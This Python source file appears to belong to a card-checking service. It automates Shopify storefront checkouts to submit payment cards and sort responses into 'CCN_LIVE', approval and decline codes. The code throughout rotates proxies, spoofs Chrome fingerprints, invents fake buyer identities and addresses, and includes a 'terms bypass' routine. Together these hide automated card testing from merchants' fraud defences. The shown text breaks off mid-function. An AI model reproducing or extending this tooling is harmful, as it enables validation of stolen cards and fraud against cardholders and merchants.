"""
app/services/checkout_service.py - High-Throughput Shopify 1-Page Checkout & Card Processor
Ported from proven shopifyy.py production engine with full API compatibility.
"""
import os
import re
import sys
import json
import time
import random
import asyncio
from datetime import datetime
from urllib.parse import urlparse, quote
from typing import Optional, Dict, Any, List

import httpx

from app.core.config import settings
from app.core.proxy_manager import proxy_manager, normalize_proxy
from app.core.exceptions import (
    ShopifyAPIException,
    SiteDiagnosticError,
    SiteNotFoundError,
    PasswordProtectedError,
    StoreFrozenError,
    NoProductsFoundError,
    InvalidCardFormatError
)
from app.services.product_service import ProductService, normalize_site_url
from app.utils.parser import parse_cc_string, extract_clean_response

# ═══════════════════════════════════════════════════════════════════════
# CONSTANTS & RESPONSE CODES
# ═══════════════════════════════════════════════════════════════════════
CCN_LIVE_CODES = {
    "INSUFFICIENT_FUNDS", "INSUFFICIENT_FUND",
    "INVALID_CVC", "INCORRECT_CVC", "CVV_FAIL", "INVALID_CVV", "CVV_ERROR",
    "EXPIRED_CARD", "INVALID_EXPIRY",
    "PAYMENTS_CREDIT_CARD_BASE_INSUFFICIENT_FUNDS",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_CVC",
    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
}
APPROVAL_CODES = {
    "PAYMENTS_CREDIT_CARD_BASE_INSUFFICIENT_FUNDS",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_CVC",
    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
}
DECLINE_CODES = {
    "PAYMENTS_CREDIT_CARD_BASE_STOLEN_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_LOST_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_FRAUDULENT",
    "PAYMENTS_CREDIT_CARD_BASE_GENERIC_DECLINE",
    "PAYMENTS_CREDIT_CARD_BASE_DO_NOT_HONOR",
    "PAYMENTS_CREDIT_CARD_BASE_PICKUP_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_NUMBER",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_EXPIRY",
    "PAYMENTS_CREDIT_CARD_BASE_CALL_ISSUER",
    "GENERIC_ERROR",
}
SITE_SKIP_CODES = {
    "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP",
    "PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE",
    "PAYMENTS_INVALID_GATEWAY_FOR_DEVELOPMENT_STORE",
    "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE",
    "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE",
    "REQUIRED_ARTIFACTS_UNAVAILABLE",
}

# ═══════════════════════════════════════════════════════════════════════
# HTTP CLIENT (curl_cffi with httpx fallback)
# ═══════════════════════════════════════════════════════════════════════
_CURL_CFFI_AVAILABLE = False
try:
    from curl_cffi.requests import AsyncSession as _CurlAsyncSession
    from curl_cffi.requests.errors import RequestsError as _CurlRequestsError
    _CURL_CFFI_AVAILABLE = True
except ImportError:
    pass

_CHROME_TO_IMPERSONATE = {
    "136": "chrome136", "133": "chrome133a", "131": "chrome131",
    "124": "chrome124", "123": "chrome123", "120": "chrome120",
}
_CURL_IMPERSONATE = list(_CHROME_TO_IMPERSONATE.values())


class _CurlSessionWrapper:
    def __init__(self, session):
        self._s = session

    @staticmethod
    def _clean_headers(headers):
        if not headers:
            return headers
        cleaned = {}
        for k, v in headers.items():
            if isinstance(v, str):
                cleaned[k] = v.encode("ascii", errors="ignore").decode("ascii")
            else:
                cleaned[k] = v
        return cleaned

    async def get(self, url, **kwargs):
        if "headers" in kwargs:
            kwargs["headers"] = self._clean_headers(kwargs["headers"])
        return await self._s.get(url, **kwargs)

    async def post(self, url, **kwargs):
        if "headers" in kwargs:
            kwargs["headers"] = self._clean_headers(kwargs["headers"])
        return await self._s.post(url, **kwargs)

    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        await self._s.close()


def _create_async_client(proxy_url=None, timeout=30.0, chrome_version=None):
    if _CURL_CFFI_AVAILABLE:
        impersonate = (
            _CHROME_TO_IMPERSONATE[chrome_version]
            if chrome_version in _CHROME_TO_IMPERSONATE
            else random.choice(_CURL_IMPERSONATE)
        )
        kw = {"impersonate": impersonate, "allow_redirects": True, "timeout": timeout, "verify": False}
        if proxy_url:
            kw["proxy"] = proxy_url
        return _CurlSessionWrapper(_CurlAsyncSession(**kw))

    client_kw = {
        "follow_redirects": True,
        "timeout": httpx.Timeout(timeout, connect=8.0, read=25.0, write=8.0, pool=5.0),
        "limits": httpx.Limits(max_connections=100, max_keepalive_connections=20),
    }
    if proxy_url:
        client_kw["proxy"] = proxy_url
    return httpx.AsyncClient(**client_kw)


# ═══════════════════════════════════════════════════════════════════════
# FINGERPRINTS
# ═══════════════════════════════════════════════════════════════════════
_FP_CHROME_BUILDS = {
    "136": "136.0.7103.93", "133": "133.0.6943.126",
    "131": "131.0.6778.85", "124": "124.0.6367.118",
    "123": "123.0.6312.86", "120": "120.0.6099.109",
}
_FP_CHROME_WIN = [
    f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{b} Safari/537.36"
    for b in _FP_CHROME_BUILDS.values()
]
_FP_CHROME_MAC = [
    f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{b} Safari/537.36"
    for b in _FP_CHROME_BUILDS.values()
]
_FP_ALL_UAS = _FP_CHROME_WIN + _FP_CHROME_MAC

_FP_ACCEPT_LANGS = [
    "en-US,en;q=0.9", "en-US,en;q=0.9,es;q=0.8", "en-US,en;q=0.9,fr;q=0.8",
    "en-US,en;q=0.9,de;q=0.8", "en-US,en;q=0.9,pt;q=0.7", "en-GB,en;q=0.9",
]
_FP_CHROME_BRANDS_MAP = {
    "136": ('"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
            '"Chromium";v="136.0.7103.93", "Google Chrome";v="136.0.7103.93", "Not.A/Brand";v="99.0.0.0"'),
    "133": ('"Not?A_Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            '"Not?A_Brand";v="99.0.0.0", "Google Chrome";v="133.0.6943.126", "Chromium";v="133.0.6943.126"'),
    "131": ('"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            '"Google Chrome";v="131.0.6778.85", "Chromium";v="131.0.6778.85", "Not_A Brand";v="24.0.0.0"'),
    "124": ('"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            '"Chromium";v="124.0.6367.118", "Google Chrome";v="124.0.6367.118", "Not-A.Brand";v="99.0.0.0"'),
    "120": ('"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.109", "Google Chrome";v="120.0.6099.109"'),
}
_FP_VIEWPORTS = ["1920x1080", "1366x768", "1536x864", "1440x900", "1280x720", "2560x1440"]
_RE_CHROME_VER = re.compile(r"Chrome/(\d+)")
_FALLBACK_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36"


def _build_fingerprint():
    ua = random.choice(_FP_ALL_UAS)
    m = _RE_CHROME_VER.search(ua)
    chrome_ver = m.group(1) if m else "136"
    ch_ua, ch_ua_full = _FP_CHROME_BRANDS_MAP.get(chrome_ver, _FP_CHROME_BRANDS_MAP["136"])
    platform, mobile = ('"macOS"', "?0") if "Macintosh" in ua else ('"Windows"', "?0")
    fp = {
        "_chrome_ver": chrome_ver,
        "User-Agent": ua,
        "Accept-Language": random.choice(_FP_ACCEPT_LANGS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "viewport": random.choice(_FP_VIEWPORTS),
        "screen-depth": "24",
        "Sec-Ch-Ua": ch_ua,
        "Sec-Ch-Ua-Mobile": mobile,
        "Sec-Ch-Ua-Platform": platform,
    }
    return fp


# ═══════════════════════════════════════════════════════════════════════
# REGEX & STRING HELPERS
# ═══════════════════════════════════════════════════════════════════════
_RE_SESSION_TOKEN = re.compile(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"')
# New Shopify checkout formats (2024+)
_RE_SESSION_TOKEN_V2 = re.compile(r'"sessionToken"\s*:\s*"([A-Za-z0-9_\-\.]+)"')
_RE_SESSION_TOKEN_V3 = re.compile(r'x-checkout-one-session-token["\s]*:\s*["\']([A-Za-z0-9_\-\.]+)["\']')
_RE_SESSION_TOKEN_V4 = re.compile(r'"token"\s*:\s*"([A-Za-z0-9_\-]{30,})"')
_RE_CHECKOUT_URL = re.compile(r'href="(/checkouts/[^"]+)"')
_RE_DELIVERY_LINE_1 = re.compile(r'"deliveryLineStableId"\s*:\s*"([^"]+)"')
_RE_DELIVERY_LINE_2 = re.compile(r'"deliveryGroupStableId"\s*:\s*"([^"]+)"')
_RE_DELIVERY_LINE_3 = re.compile(r"deliveryLineStableId['\"]\s*:\s*['\"]([^'\"]+)['\"]")
_RE_DELIVERY_LINE_4 = re.compile(r'deliveryLines&quot;:\[\{&quot;stableId&quot;:&quot;([^&]+)&quot;')
_RE_DELIVERY_LINE_5 = re.compile(r'"deliveryLines"\s*:\s*\[\s*\{\s*"stableId"\s*:\s*"([^"]+)"')
_RE_DELIVERY_METHOD = re.compile(r'deliveryMethodTypes&quot;:\[&quot;([^&]+)&quot;')
_RE_DELIVERY_METHOD_2 = re.compile(r'"deliveryMethodTypes"\s*:\s*\[\s*"([^"]+)"')
_RE_DELIVERY_STRATEGY = re.compile(r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"')

_HEADER_FILTER_FULL = frozenset({
    "user-agent", "accept", "accept-language", "accept-encoding",
    "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
    "sec-fetch-dest", "sec-fetch-mode", "sec-fetch-site", "sec-fetch-user",
    "upgrade-insecure-requests", "cache-control", "connection",
})


def find_between(s, start, end):
    try:
        i = s.find(start)
        if i == -1:
            return ""
        i += len(start)
        j = s.find(end, i)
        return s[i:j] if j != -1 else ""
    except Exception:
        return ""


def _extract_delivery_line_stable_id(html_text):
    if not html_text:
        return None
    v = find_between(html_text, 'deliveryLineStableId&quot;:&quot;', '&quot;')
    if v:
        return v
    v = find_between(html_text, 'deliveryGroupStableId&quot;:&quot;', '&quot;')
    if v:
        return v
    for rx in (_RE_DELIVERY_LINE_1, _RE_DELIVERY_LINE_2, _RE_DELIVERY_LINE_3,
               _RE_DELIVERY_LINE_4, _RE_DELIVERY_LINE_5):
        m = rx.search(html_text)
        if m:
            return m.group(1)
    return None


def _detect_requires_shipping(html_text):
    if not html_text:
        return None
    m = _RE_DELIVERY_METHOD.search(html_text)
    if m:
        return m.group(1) != 'NONE'
    m = _RE_DELIVERY_METHOD_2.search(html_text)
    if m:
        return m.group(1) != 'NONE'
    if 'requiresShipping&quot;:false' in html_text or '"requiresShipping":false' in html_text:
        return False
    if 'requiresShipping&quot;:true' in html_text or '"requiresShipping":true' in html_text:
        return True
    return None


def _extract_delivery_strategy_handle(html_text):
    if not html_text:
        return None
    v = find_between(html_text, 'selectedDeliveryStrategy&quot;:{&quot;handle&quot;:&quot;', '&quot;')
    if v:
        return v
    m = _RE_DELIVERY_STRATEGY.search(html_text)
    if m:
        return m.group(1)
    return None


def classify_ccn_live(code):
    if not code:
        return None
    c = str(code).upper()
    if c in CCN_LIVE_CODES:
        return "CCN_LIVE"
    return None


# ═══════════════════════════════════════════════════════════════════════
# RANDOM IDENTITY & ADDRESS
# ═══════════════════════════════════════════════════════════════════════
_POOL_ADDRESSES = (
    {"add1": "123 Main St", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04101"},
    {"add1": "456 Oak Ave", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04102"},
    {"add1": "789 Pine Rd", "city": "Bangor", "state": "Maine", "state_short": "ME", "zip": "04401"},
    {"add1": "321 Elm St", "city": "Lewiston", "state": "Maine", "state_short": "ME", "zip": "04240"},
    {"add1": "1200 Market St", "city": "Wilmington", "state": "Delaware", "state_short": "DE", "zip": "19801"},
    {"add1": "950 Penn Ave", "city": "Dover", "state": "Delaware", "state_short": "DE", "zip": "19901"},
    {"add1": "88 Broad St", "city": "Burlington", "state": "Vermont", "state_short": "VT", "zip": "05401"},
    {"add1": "1425 Broadway", "city": "New York", "state": "New York", "state_short": "NY", "zip": "10018"},
    {"add1": "350 5th Ave", "city": "New York", "state": "New York", "state_short": "NY", "zip": "10118"},
    {"add1": "1600 Vine St", "city": "Los Angeles", "state": "California", "state_short": "CA", "zip": "90028"},
    {"add1": "233 S Wacker Dr", "city": "Chicago", "state": "Illinois", "state_short": "IL", "zip": "60606"},
    {"add1": "1500 Market St", "city": "Philadelphia", "state": "Pennsylvania", "state_short": "PA", "zip": "19102"},
    {"add1": "2000 McKinney Ave", "city": "Dallas", "state": "Texas", "state_short": "TX", "zip": "75201"},
    {"add1": "100 Peachtree St", "city": "Atlanta", "state": "Georgia", "state_short": "GA", "zip": "30303"},
    {"add1": "701 Brickell Ave", "city": "Miami", "state": "Florida", "state_short": "FL", "zip": "33131"},
    {"add1": "1201 3rd Ave", "city": "Seattle", "state": "Washington", "state_short": "WA", "zip": "98101"},
)
_POOL_FIRST_NAMES = (
    "John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa",
    "James", "Jennifer", "Robert", "Amanda", "Daniel", "Ashley", "Matthew",
    "Megan", "Andrew", "Lauren", "Ryan", "Rachel", "Joshua", "Stephanie",
)
_POOL_LAST_NAMES = (
    "Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis",
    "Martinez", "Anderson", "Taylor", "Thomas", "Jackson", "White",
    "Harris", "Clark", "Lewis", "Robinson", "Walker", "Young",
)
_POOL_DOMAINS = ("gmail.com", "yahoo.com", "outlook.com", "icloud.com", "hotmail.com")
_POOL_PHONES = ("2025550199", "3105551234", "4155559876", "6175550123", "2125559999", "7735551212")


def _get_random_buyer():
    a = random.choice(_POOL_ADDRESSES)
    fn = random.choice(_POOL_FIRST_NAMES)
    ln = random.choice(_POOL_LAST_NAMES)
    email = f"{fn.lower()}.{ln.lower()}{random.randint(100, 9999)}@{random.choice(_POOL_DOMAINS)}"
    return {
        "fname": fn, "lname": ln, "email": email,
        "phone": random.choice(_POOL_PHONES),
        "add1": a["add1"], "city": a["city"],
        "state": a["state"], "state_short": a["state_short"], "zip": a["zip"],
    }


# ═══════════════════════════════════════════════════════════════════════
# DELIVERY PAYLOAD
# ═══════════════════════════════════════════════════════════════════════
def _build_delivery_payload(stable_id, delivery_line_stable_id, add1, city, zip_code, fname, lname, state_short, phone, destination_changed=True, delivery_option_handle=None, requires_shipping=True, delivery_strategy_handle=None):
    if not requires_shipping:
        line = {
            "selectedDeliveryStrategy": {
                "deliveryStrategyMatchingConditions": {
                    "estimatedTimeInTransit": {"any": True},
                    "shipments": {"any": True},
                },
                "options": {},
            },
            "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
            "deliveryMethodTypes": ["NONE"],
            "expectedTotalPrice": {"any": True},
            "destinationChanged": False,
        }
        if delivery_line_stable_id:
            line["stableId"] = delivery_line_stable_id
        return {
            "deliveryLines": [line],
            "noDeliveryRequired": [],
            "useProgressiveRates": False,
            "prefetchShippingRatesStrategy": None,
        }
    strategy = {"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, "options": {}}
    if delivery_option_handle:
        strategy = {
            "selectedDeliveryOptions": [{"handle": delivery_option_handle}],
            "deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}},
            "options": {},
        }
    line = {
        "selectedDeliveryStrategy": strategy,
        "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
        "destination": {"streetAddress": {"address1": add1, "address2": "", "city": city, "countryCode": "US", "postalCode": zip_code, "company": "", "firstName": fname, "lastName": lname, "zoneCode": state_short, "phone": phone}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {"any": True},
        "destinationChanged": destination_changed,
    }
    if delivery_line_stable_id:
        line["stableId"] = delivery_line_stable_id
    return {
        "deliveryLines": [line],
        "noDeliveryRequired": [],
        "useProgressiveRates": False,
        "prefetchShippingRatesStrategy": None,
    }


# ═══════════════════════════════════════════════════════════════════════
# GRAPHQL QUERIES
# ═══════════════════════════════════════════════════════════════════════
_POLL_QUERY = "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}"

_SUBMIT_QUERY = "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}"


# ═══════════════════════════════════════════════════════════════════════
# WAITING_PENDING_TERMS BYPASS
# ═══════════════════════════════════════════════════════════════════════
async def _attempt_terms_bypass(session, graphql_url, graphql_headers, original_payload, site_url, user_agent):
    try:
        checkout_url = original_payload.get("variables", {}).get("input", {}).get("analytics", {}).get("requestUrl", "")
        if not checkout_url:
            checkout_url = f"{site_url}/checkout"

        ref = await session.get(
            checkout_url,
            headers={
                "User-Agent": user_agent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            }
        )

        if ref.status_code == 200:
            rt = ref.text
            terms_token = None
            for pattern in [
                'termsToken&quot;:&quot;', 'acceptTermsToken&quot;:&quot;',
                'pendingTermsToken&quot;:&quot;', '"termsToken":"',
                '"acceptTermsToken":"',
            ]:
                if '&quot;' in pattern:
                    terms_token = find_between(rt, pattern, '&quot;')
                else:
                    terms_token = find_between(rt, pattern, '"')
                if terms_token:
                    break

            nst = _RE_SESSION_TOKEN.search(rt)
            if nst:
                original_payload["variables"]["input"]["sessionInput"]["sessionToken"] = nst.group(1)
                graphql_headers["x-checkout-one-session-token"] = nst.group(1)
            nq = find_between(rt, 'queueToken&quot;:&quot;', '&quot;')
            if nq:
                original_payload["variables"]["input"]["queueToken"] = nq

            if terms_token:
                if "checkpointData" not in original_payload["variables"]["input"] or not original_payload["variables"]["input"]["checkpointData"]:
                    original_payload["variables"]["input"]["checkpointData"] = {}
                if isinstance(original_payload["variables"]["input"]["checkpointData"], dict):
                    original_payload["variables"]["input"]["checkpointData"]["termsToken"] = terms_token
                    original_payload["variables"]["input"]["checkpointData"]["acceptedTerms"] = True

        try:
            delivery = original_payload["variables"]["input"].get("delivery", {})
            for line in delivery.get("deliveryLines", []):
                if "destinationChanged" in line:
                    line["destinationChanged"] = False
        except Exception:
            pass

        original_payload["variables"]["attemptToken"] = f"terms-bypass-{random.random()}"
        await asyncio.sleep(0.5)
        resp = await session.post(graphql_url, headers=graphql_headers, json=original_payload)

        if resp.status_code == 200:
            data = resp.json()
            completion = data.get("data", {}).get("submitForCompletion", {}) or {}
            receipt = completion.get("receipt")
            if receipt and receipt.get("id"):
                return {"bypassed": True, "response": data, "receipt": receipt}
            errors = completion.get("errors", [])
            error_codes = [e.get("code") for e in errors if e.get("code")]
            if "WAITING_PENDING_TERMS" in error_codes:
                return {"bypassed": False, "error": "WAITING_PENDING_TERMS persists"}
            return {"bypassed": False, "error": f"Different response: {completion.get('__typename')}"}

        return {"bypassed": False, "error": f"HTTP {resp.status_code}"}
    except Exception as e:
        return {"bypassed": False, "error": str(e)[:100]}


# ═══════════════════════════════════════════════════════════════════════
# CHECKOUT SERVICE IMPLEMENTATION
# ═══════════════════════════════════════════════════════════════════════
class CheckoutService:
    """Core Engine executing concurrent Shopify One-Page GraphQL Checkouts."""

    @classmethod
    async def process_card(
        cls,
        cc_string: Optional[str],
        site_url: str,
        variant_id: Optional[str] = None,
        proxy_override: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Executes end-to-end card verification with high accuracy using shopifyy.py architecture.
        """
        start_time = time.monotonic()
        gateway = "Shopify Payments"
        total_price = 0.0
        product_price = 0.0
        product_title = ""
        shipping_amount = 0.0
        currency = "USD"
        ourl = normalize_site_url(site_url)

        # 1. Parse Card Format (if provided)
        cc_num = ""
        mes = ""
        ano = ""
        cvv = ""
        if cc_string and cc_string.strip():
            card = parse_cc_string(cc_string)
            cc_num = card["cc"]
            mes = card["mes"]
            ano = card["ano"]
            cvv = card["cvv"]
        else:
            cc_string = ""

        active_proxy = normalize_proxy(proxy_override) if proxy_override else proxy_manager.get_proxy()

        def _respond(status_val: bool, code_val: str, price_val: Optional[float] = None) -> Dict[str, Any]:
            p = price_val if price_val is not None else total_price
            return cls._build_response(
                status=status_val,
                response_code=code_val,
                gateway=gateway,
                price=p,
                cc=cc_string,
                start_time=start_time,
                product_price=product_price,
                product_title=product_title,
                shipping_price=shipping_amount,
                currency=currency
            )

        try:
            # 2. Acquire Lowest Price Product Variant if not provided
            if not variant_id:
                try:
                    product_info = await ProductService.get_lowest_product(
                        site_url=ourl,
                        proxy_override=active_proxy
                    )
                    variant_id = str(product_info["variant_id"])
                    product_price = float(product_info["price"])
                    product_title = str(product_info.get("title", ""))
                    total_price = product_price
                except SiteDiagnosticError as sde:
                    return _respond(False, sde.code)
                except Exception as e:
                    return _respond(False, f"PRODUCT_ERROR: {str(e)[:30]}")
            else:
                product_price = total_price or 0.0
                product_title = f"Variant {variant_id}"

            fingerprint = _build_fingerprint()
            user_agent = fingerprint.get("User-Agent") or _FALLBACK_UA

            # 3. Create Session
            async with _create_async_client(proxy_url=active_proxy, timeout=settings.REQUEST_TIMEOUT, chrome_version=fingerprint.get("_chrome_ver")) as session:
                product_header = {k: v for k, v in fingerprint.items() if k.lower() in _HEADER_FILTER_FULL}
                product_header["User-Agent"] = user_agent

                # Visit root storefront
                try:
                    home_headers = dict(product_header)
                    home_headers["Sec-Fetch-Dest"] = "document"
                    home_headers["Sec-Fetch-Mode"] = "navigate"
                    home_headers["Sec-Fetch-Site"] = "none"
                    await session.get(ourl, headers=home_headers)
                except Exception:
                    pass

                # Add variant to cart
                cart_add_headers = dict(product_header)
                cart_add_headers["Referer"] = f"{ourl}/"
                cart_add_headers["Sec-Fetch-Dest"] = "empty"
                cart_add_headers["Sec-Fetch-Mode"] = "cors"
                cart_add_headers["Sec-Fetch-Site"] = "same-origin"
                cart_add_headers["content-type"] = "application/x-www-form-urlencoded"
                cart_add_headers["origin"] = ourl
                cart_add_headers["X-Requested-With"] = "XMLHttpRequest"

                add_data = {"id": str(variant_id), "quantity": "1", "form_type": "product"}
                try:
                    add_resp = await session.post(f"{ourl}/cart/add.js", headers=cart_add_headers, data=add_data)
                    if add_resp.status_code != 200:
                        # Fallback JSON add
                        await session.post(
                            f"{ourl}/cart/add.js",
                            headers={**cart_add_headers, "content-type": "application/json"},
                            json={"items": [{"id": int(variant_id), "quantity": 1}]}
                        )
                except Exception:
                    pass

                # Read cart token
                try:
                    cart_resp = await session.get(f"{ourl}/cart.js", headers=cart_add_headers)
                    cart_data = cart_resp.json()
                    token = cart_data.get("token") or "cart"
                except Exception:
                    token = "cart"

                # Initiate checkout session
                checkout_doc_headers = {
                    "User-Agent": user_agent,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "Accept-Language": fingerprint.get("Accept-Language", "en-US,en;q=0.9"),
                    "Accept-Encoding": "gzip, deflate, br",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": ourl,
                    "referer": f"{ourl}/cart",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-User": "?1",
                    "Upgrade-Insecure-Requests": "1",
                }
                for ch in ("Sec-Ch-Ua", "Sec-Ch-Ua-Mobile", "Sec-Ch-Ua-Platform"):
                    if ch in fingerprint:
                        checkout_doc_headers[ch] = fingerprint[ch]

                checkout_resp = await session.post(f"{ourl}/cart", headers=checkout_doc_headers, data={"checkout": "", "updates[]": "1"})
                response_text = checkout_resp.text
                curr_url = str(checkout_resp.url).lower()

                # Fallback to GET /checkout if needed
                if "serialized-sessiontoken" not in response_text.lower():
                    checkout_resp = await session.get(f"{ourl}/checkout?skip_shop_pay=true", headers=checkout_doc_headers)
                    response_text = checkout_resp.text
                    curr_url = str(checkout_resp.url).lower()

                if "login" in curr_url or "account" in curr_url:
                    return _respond(False, "LOGIN_REQUIRED")
                if "password" in curr_url:
                    return _respond(False, "PASSWORD_PROTECTED")

                def _extract_session_token(html: str) -> Optional[str]:
                    """Try every known Shopify session-token format, old and new."""
                    # 1. Classic serialized-sessionToken meta tag (HTML-entity encoded)
                    m = _RE_SESSION_TOKEN.search(html)
                    if m:
                        return m.group(1)
                    # 2. Raw find_between variants (entity-encoded and plain JSON)
                    for start, end in [
                        ('serialized-sessionToken" content="&quot;', '&quot;"'),
                        ("serialized-sessionToken' content='&quot;", "&quot;'"),
                        ('"sessionToken":"', '"'),
                        ("'sessionToken':'", "'"),
                        ('sessionToken&quot;:&quot;', '&quot;'),
                        ('"checkoutSessionToken":"', '"'),
                        ('checkoutSessionToken&quot;:&quot;', '&quot;'),
                    ]:
                        v = find_between(html, start, end)
                        if v and len(v) > 10:
                            return v
                    # 3. New 2024+ checkout JSON formats via regex
                    for rx in (_RE_SESSION_TOKEN_V2, _RE_SESSION_TOKEN_V3):
                        m2 = rx.search(html)
                        if m2 and len(m2.group(1)) > 10:
                            return m2.group(1)
                    return None

                session_token = _extract_session_token(response_text)

                # Extra fallback: follow the actual /checkouts/cn/... URL Shopify redirects to
                if not session_token:
                    final_url = str(checkout_resp.url)
                    if "/checkouts/" in final_url:
                        try:
                            co_resp2 = await session.get(final_url, headers=checkout_doc_headers)
                            if co_resp2.status_code == 200:
                                response_text = co_resp2.text
                                curr_url = final_url.lower()
                                session_token = _extract_session_token(response_text)
                        except Exception:
                            pass

                # Last-resort: find checkout href embedded in the page and follow it
                if not session_token:
                    m_co = _RE_CHECKOUT_URL.search(response_text)
                    if m_co:
                        try:
                            alt_url = ourl + m_co.group(1)
                            co_resp3 = await session.get(alt_url, headers=checkout_doc_headers)
                            if co_resp3.status_code == 200:
                                response_text = co_resp3.text
                                curr_url = alt_url.lower()
                                session_token = _extract_session_token(response_text)
                        except Exception:
                            pass

                if not session_token:
                    return _respond(False, "CHECKOUT_SESSION_FAILED")

                queue_token = find_between(response_text, 'queueToken&quot;:&quot;', '&quot;') or find_between(response_text, '"queueToken":"', '"')
                stable_id = find_between(response_text, 'stableId&quot;:&quot;', '&quot;') or find_between(response_text, '"stableId":"', '"') or "1"
                paymentMethodIdentifier = find_between(response_text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;') or find_between(response_text, '"paymentMethodIdentifier":"', '"')
                
                # Extract gateway display name
                gw_cand = find_between(response_text, 'extensibilityDisplayName&quot;:&quot;', '&quot;') or find_between(response_text, '"extensibilityDisplayName":"', '"')
                if gw_cand:
                    gateway = gw_cand
                elif paymentMethodIdentifier:
                    gateway = "Shopify Payments"

                _checkpoint_token = find_between(response_text, 'checkpointToken&quot;:&quot;', '&quot;') or find_between(response_text, 'captchaToken&quot;:&quot;', '&quot;') or find_between(response_text, '"checkpointToken":"', '"')
                _checkpoint_data = {"token": _checkpoint_token} if _checkpoint_token else None

                delivery_line_stable_id = _extract_delivery_line_stable_id(response_text)
                requires_shipping = _detect_requires_shipping(response_text)
                if requires_shipping is None:
                    requires_shipping = True
                delivery_strategy_handle = _extract_delivery_strategy_handle(response_text)
                delivery_option_handle = None

                curr_cand = find_between(response_text, '"currency":"', '"') or find_between(response_text, 'currency&quot;:&quot;', '&quot;')
                if curr_cand:
                    currency = curr_cand.upper()

                # If no card was supplied, return gateway inspection immediately
                if not cc_num:
                    return _respond(True, "GATEWAY_READY")

                # 4. Generate Random US Buyer Identity & Address
                buyer = _get_random_buyer()
                fname, lname = buyer["fname"], buyer["lname"]
                email, phone = buyer["email"], buyer["phone"]
                add1 = buyer["add1"]
                city = buyer["city"]
                state_short = buyer["state_short"]
                zip_code = str(buyer["zip"])

